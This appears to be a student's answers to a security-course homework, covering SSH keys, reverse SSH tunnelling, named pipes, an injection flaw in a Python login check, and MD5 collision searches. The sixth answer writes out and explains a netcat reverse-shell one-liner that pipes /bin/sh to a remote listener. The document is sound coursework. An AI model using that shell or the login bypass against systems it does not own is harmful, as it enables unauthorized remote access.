# Homework 1

1. Enable public-key logins on moxie for your account. You should no longer be using passwords after this. Be sure and list the steps as well as demonstrate your password-less login to moxie.

    **Answer:** The following steps can be used to setup password-less login

    * Run the  `ssh-keygen` command to generate a public/private key pair
    * Run `ssh-copy-id icyfire@moxie` and enter the password for moxie when prompted to copy the public key to moxie.
    * Verify the password-less login by logging into moxie using `ssh icyfire@moxie`
    * The public key should be copied to the file `~/.ssh/authorized_keys`

    Note: I did not generate a key pair as I had already generated one and have been using it for multiple services. Since my private key is protected by a passphrase, I still have to enter the passphrase every time to use my private key, but the password for moxie is not being used anywhere.

1. What are the kernel versions and distros (plus versions) of kali and moxie? (Tell me how you found out!)

    **Answer:** 
    * The distro release details can be found using the following command - `lsb_release -a`
        * Moxie - Ubuntu 18.04.5 LTS
        * Kali - Kali GNU/Linux Rolling 2022.3
    * The kernel details can be found using the following command - `uname -a`
        * Moxie - 5.4.0-1063-aws (Kernel version 5.4.0 compiled for AWS)
        * Kali - 5.18.0-kali7-arm64 (Kernel version 5.18.0 compiled for Kali with arm64 architecture)

1. Use ssh to open a port on moxie that serves a shell on kali. Connect to the port on moxie from another machine and show that you can log in to kali. Explain what you had to do to accomplish this. (Note: moxie is on a public IP! Do not leave ports open... they will be found by unseemly people!)

    **Answer:** This was accomplished using reverse SSH tunneling. The below-given steps were followed:

    * Login to Kali
    * Start a reverse SSH tunnel using the `-R` parameter: `ssh -fN -R 20069:localhost:22 icyfire@moxie`
    * Login to moxie on port 20069 using Kali username and password and moxie IP address from another computer: `ssh -p 20069 rajeev@moxie`

1. Open two windows in kali. In the first window, type
    ```bash
    $ mkfifo f
    $ exec < f
    ```
    In the 2nd window, type
    ```bash
    $ echo ls > f
    ```
    a) Explain why the first window shows its directory on stdout.
    b) Explain why the first window's shell died

    **Answer:**
    * `mkfifio f` command creates a named pipe with name `f`
    * `exec < f` replaces the current shell process with the execution of whatever comes through the pipe `f`
    * In the second window `echo ls > f` pipes the command `ls` into f
    * Window 1 receives the `ls` command from the pipe `f` and executes it
    * When a FIFO is opened for reading, it blocks the calling process, which is why the shell waits in window 1. When the second window opens the FIFO for writing, then the blocked reader in window 1 is unblocked. When the window 2 writer closes the FIFO, the reading processes get EOF (0 bytes to read), and there is nothing further to be done and the window closes.

1. Open two windows in kali. In the first window, type
    ```bash
    $ mkfifo f
    $ exec < f
    ```
    In the 2nd window, type
    ```bash
    $ exec 3>f
    $ echo ls >&3
    ```
    a) Why doesn't the first window die now?
    b) Explain how to recover stdin on the first window without killing and restarting its shell.

    **Answer:**
    * `mkfifo f` creates a named pipe called `f`
    * `exec < f`, replaces the current shell process with the execution of commands coming out of the pipe `f`
    * `exec 3>f` creates a new file descriptor `3` redirecting to the pipe `f`
    * `echo ls >&3` pipes the text `ls` to the file descriptor 3 which gets piped to `f` and gets executed in the first window
    * The shell doesn't close this time because the pipe `f` is receiving from file descriptor `3` which is still open.

1. Explain how to use mkfifo to get a reverse shell with netcat when -e and -c are unavailable. You can google this if you like, but be sure and explain how it works

    **Answer:**
    * First, start a listener on moxie using `nc -nlvp 20069`
    * Create a named pipe in kali using `mkfifo f`
    * Execute the following command in Kali `cat f | /bin/sh -i 2>&1 | nc moxie 20069 >f`
    
    Breaking down the last command :

    * `cat f` outputs the contents of the pipe `f`
    * The output of `cat f` gets piped to `/bin/sh -i` which starts an interactive shell where the commands are executed
    * The prompt for the shell is printed in `stderr`. `2>&1` redirects `stderr` to `stdout` to get the prompt on the reverse shell.
    * The stdout data is then piped to the `nc` command which sends it over the network
    * The data received by `nc` is redirected to the pipe `f` and the loop continues.

1. Analyze the following python program. What is the flaw, and what inputs could you enter in order to make the program output "login successful"?
    ```python
    #!/usr/bin/python
    import hashlib

    login_db = {
            'john'   : 'f56f6c2009c63dac4328d45fe4865ccf',
            'alisha' : '09d412324fdb8f8673626ceefbb402d0',
            'chris'  : '9d9116194481d02a2e1dc8a8700f6af1',
            'jared'  : '2b00142f7481c7b056c4b410d28f33cf',
        }

    def check(cred):
        user    = cred.split('&')[0]
        pwdhash = cred.split('&')[1]
        return (user in login_db) and (login_db[user] == pwdhash)


    if __name__ == "__main__":
        username = raw_input("Username: ")
        if not username: exit("Invalid Username")

        password = raw_input("Password: ")
        if not password: exit("Invalid Password")

        # hash the password and package up with username
        userpass = username + '&' + hashlib.md5(password).hexdigest()

        if check(userpass):
            print 'Login successful'
        else:
            print 'Login rejected'
    ```

    **Answer:** The program does not validate the input for username and password. The program can be hacked by sending a valid username and hash of the password for that particular user separated by `&`. In the `check` function while splitting the `cred` variable it'll take in the hash value as the `pwdhash`, instead of the hash that was calculated in the main function.

1. Write a program that reads 4 unsigned ints sent in host byte order from moxie port 21234 adds them up, and sends the sum back to that port. (Note: the addition server uses 32-bit integers)

    When you successfully accomplish this task, you will get a username and password as output. Write these down and save them somewhere safe. You will possibly need them later.

    Also, you turn these in as the answer to this problem.
    If the service goes down (ie, you cannot connect to port 21234) let me know so I can restart it.

    **Answer:** Source code available in [q8.py](q8.py).

1. Find a Sayler 6-Collision in md5. A "Sayler 6-Collision" is a pair of distinct inputs whose md5sum matches in the first 6 and last 6 printed characters. For example this is a Sayler-6 Collision.

    ```bash
    $ md5sum file1
    d41d8ce1987fbb152380234511f8427e  file1
    $ md5sum file2
    d41d8cd98f00b204e9800998ecf8427e  file2
    ```
    Do not run your search code on moxie. Use your own computer or a lab computer. Turn in your code with your solution.

    **Answer:** Source code available in [q9.py](q9.py).
    
    Collision found for the following strings:

    Clear text: `0654884b5f77`  Hash: `2441d7905d079c447d018f8624527330`

    Clear text: `2a1dc1b8c69b`  Hash: `2441d76ee353eae3b906273dfe527330`

    The collision was found in under 16 seconds using Pollard's Rho algorithm.

1. +20 Extra Credit: Find a Sayler 10-collision; that is, two inputs whose md5sum match in the first 10 and last 10 printed characters. You will probably have to be a lot more clever here. (http://people.scs.carleton.ca/~paulv/papers/JoC97.pdf could help). I have implemented the technique outlined in that paper in two ways: I used a 48-core machine with a Java implementation (because it has thread-safe tree data structures); this took 200 core-hours to complete, or about 4.5 hours in total. Then I wrote another implementation in Python using OpenCL and ran it on my home Linux box which has an Nvidia GTX 1070 with 1,920 Cuda cores; this program found a Sayler 10-collision in 14.5 minutes.)

    **Answer:** Tried using the parallel method mentioned in the paper, but didn't have a machine with enough resources to run it for an 80-bit collision. OpenCL was terribly slow on the M1 mac. Tried Metal API by Apple, but I couldn't get that to work.

    So instead of that, I generated two binary files with the same md5 hex using fastcoli outlined in https://www.win.tue.nl/hashclash/fastcoll.pdfLinks to an external site..

    Base64 encoded values of two files with the same md5 hex:

    Data 1:

    `p9c8FrSu8gEs/QoM9FdegyO6+RU008E5Lk5BIYuRnolADfLrwSJwuk8EPTQB6LpvfAnRL+ffbHo9rUFm784Zhz/p6fXYpS+9YQPz2wsfF3NEshFnAnvgXd2bFMHcYH0ueVOW4mDkUmCfeK0POWlfJAh63HeKblHybJWbiJT+tWk=`

    Data 2:

    `p9c8FrSu8gEs/QoM9FdegyO6+ZU008E5Lk5BIYuRnolADfLrwSJwuk8EPTQBaLtvfAnRL+ffbHo9rUHm784Zhz/p6fXYpS+9YQPz2wsfF3NEshHnAnvgXd2bFMHcYH0ueVOW4mDkUmCfeK0POeleJAh63HeKblHybJWbCJT+tWk=`

    MD5 hash:

    `1b9630672cb980ca8e5028cc8b20821c`
